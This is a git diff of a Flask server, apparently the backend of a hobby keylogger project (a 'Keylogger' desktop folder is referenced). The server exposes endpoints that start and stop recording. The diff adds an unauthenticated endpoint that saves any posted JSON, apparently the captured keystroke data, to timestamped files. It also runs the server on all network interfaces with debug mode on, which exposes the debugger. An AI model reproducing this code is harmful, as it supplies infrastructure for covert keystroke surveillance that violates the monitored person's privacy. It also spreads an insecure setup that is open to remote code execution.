@@ -1,12 +1,23 @@
-import json
-import os
-from flask import Flask, jsonify
+from flask import Flask, jsonify, render_template,request
 from manager import Manager
 from flask_cors import CORS
+import json
+import os
+import datetime
+
 
 app = Flask(__name__)
-CORS(app)
 record = Manager()
+CORS(app)
+
+DATA_FOLDER = "received_data"
+
+if not os.path.exists(DATA_FOLDER):
+    os.makedirs(DATA_FOLDER)
+
+@app.get("/")
+def index():
+    return "hi shuki!"
 
 
 @app.route('/startRecording', methods=['POST'])
@@ -14,29 +25,35 @@ def startRecording():
     record.start_recording()
     return jsonify({"message": "הסקריפט הופעל בהצלחה!"}), 200
 
+
 @app.route('/stopRecording', methods=['POST'])
 def stopRecording():
     record.stop_recording()
     return jsonify({"message": "הסקריפט הופעל בהצלחה!"}), 200
 
-@app.route('/receiveData', methods=['GET'])
-def receiveData():
-    data = record.data.enter_to_dic()
-    return jsonify(data)
+
+@app.route('/', methods=['POST'])
+def receive_data():
+    data = request.get_json()
+    if data:
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"data_{timestamp}.json"
+        filepath = os.path.join(DATA_FOLDER, filename)
+
+        try:
+            with open(filepath, 'w') as f:
+                json.dump(data, f, indent=4)
+            print(f"Data saved to {filepath}")
+            return jsonify({"message": "Data received and saved successfully!"}), 200
+        except Exception as e:
+            print(f"Error saving data to file: {e}")
+            return jsonify({"error": "Error saving data!"}), 500
+
+    else:
+        return jsonify({"error": "No data received!"}), 400
 
 
-@app.route('/files', methods=['GET'])
-def files():
-    directory = "C:/Users/shuki/Desktop/Keylogger/"
 
-    # בודק שהתיקייה קיימת
-    if not os.path.exists(directory):
-        return jsonify({"error": "Directory not found"}), 404
-
-    # מוצא את כל הקבצים עם סיומת .json
-    json_files = [file for file in os.listdir(directory) if file.endswith(".json")]
-
-    return json_files
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host="0.0.0.0",port=5000,debug=True)
